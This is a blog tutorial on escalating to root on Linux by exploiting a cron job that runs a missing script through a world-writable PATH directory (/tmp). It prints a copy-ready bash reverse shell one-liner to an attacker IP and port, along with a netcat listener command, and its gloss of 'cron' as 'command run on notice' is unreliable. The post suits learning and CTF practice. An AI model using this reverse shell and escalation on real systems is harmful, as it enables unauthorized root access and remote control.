---
layout: post
title: Rooting with forgotten CronJobs
subtitle: How to take advantage of forgotten cronjobs to get root access on a host
cover-img: /assets/img/rooting-forgotten-cronjobs/cover.jpg
tags: [cronjob, root, linux, hack, script]
comments: true
---

As you might have guessed by the title, in this article, we will explore another scenario where we could take advantage of forgotten cronjobs to gain our precious root access. BUT FIRST, if you are new here, or missed the previous articles about this, don’t hesitate to pay a visit to [PART I](https://orianaolivetti.github.io/2023-07-14-rooting-is-easy/) or [PART II](https://orianaolivetti.github.io/2023-02-23-rooting-with-docker/), totally worth it! 

And now, focusing on the topic of today... 

**What are… cronjobs?**

Well, "cron" stands for **command run on notice**, and yes! As it sounds like. A cronjob is a script that was scheduled to be executed periodically. 
You can list your own cronjobs by typing **crontab -l** or checking the ones in the system by seeing what is inside the **/etc/crontab** file.

Alright, I understand, but… how can this can help you get root access? If we are lucky enough, we will find a forgotten cronjob, which no longer exists, that we can modify to our advantage! 
However, we need to have our fingers crossed so that we find a place where we have write permissions. More on that later! Don’t worry for now. 

**Let’s begin with the fun stuff**

Oh no! What happened? For some reason I’m stuck as this low-privilege user called simba. Well… I’ll have to find a way to get root access as soon as possible so I can do important stuff! 

First, let’s see what cronjobs are available. Feel free to experiment alongside simba and type **cat /etc/crontab**

![Terminal](/assets/img/rooting-forgotten-cronjobs/cron1.png){: .mx-auto.d-block :}

Here we have some interesting information. Let me explain…
1. We see that there are only 2 scripts running every minute, **backup.sh** and **server_connect.py**
2. Both scripts are run with **root** permissions.
3. The **first script** is located in oriana’s home, so most probably we won’t have access to modify the contents of that particular script.
4. The **second script**, has no absolute path. When this happens, the crontab binary will look for the script in all locations listed on the **PATH** variable on top of the file.

So… as you might be thinking, our salvation could be the server_connect.py script in case it is located somewhere we have write access to! Let’s check first if the script exists already.
~~~
find / -name server_connect.py 2>/dev/null
~~~
![Terminal](/assets/img/rooting-forgotten-cronjobs/cron2.png){: .mx-auto.d-block :}

This means the file does not exist. So we might be able to create it in one of the directories listed on **PATH**. Where could simba have write access? Have you guessed already?
Of course! Everyone can write on the **/tmp** folder!. So now we could execute a reverse shell with root permissions.

![Terminal](/assets/img/rooting-forgotten-cronjobs/cron3.png){: .mx-auto.d-block :}

Simba will create then a server_connect.py script on the /tmp folder. In there, he added a bash script for executing a reverse shell. Yes, a bash script, because even though it used to by a python script, it is just the name of the file. That is why we declare the binary to execute on top.

There you go, feel free to copy it! And replace it with your own ip and port for the reverse shell. 
~~~
#!/bin/bash

bash -i >& /dev/tcp/<ip>/<port> 0>&1
~~~

And don’t forget to give it execution access!!
~~~
chmod +x server_connect.py
~~~
![Terminal](/assets/img/rooting-forgotten-cronjobs/cron4.png){: .mx-auto.d-block :}

**Are we ready now?**

Almost there! We just need to start a listener on that same port, so the reverse shell can connect! Let’s type **nc -nlvp 4444**  on the console and wait…
And after a minute, we got it! We got a reverse shell with root permissions! 

![Terminal](/assets/img/rooting-forgotten-cronjobs/cron5.png){: .mx-auto.d-block :}

Now we we are ready to do more hacking! Like reading sensitive files, or perform system-level actions. The sky is the limit! 

**Conclusion**

From now on, you and simba know how to gain root access when some forgotten scripts are available to run as root periodically, due to security misconfigurations. 
It is time to have fun and nplay some CTFs with this trick under our sleeve! 

Happy Hacking! 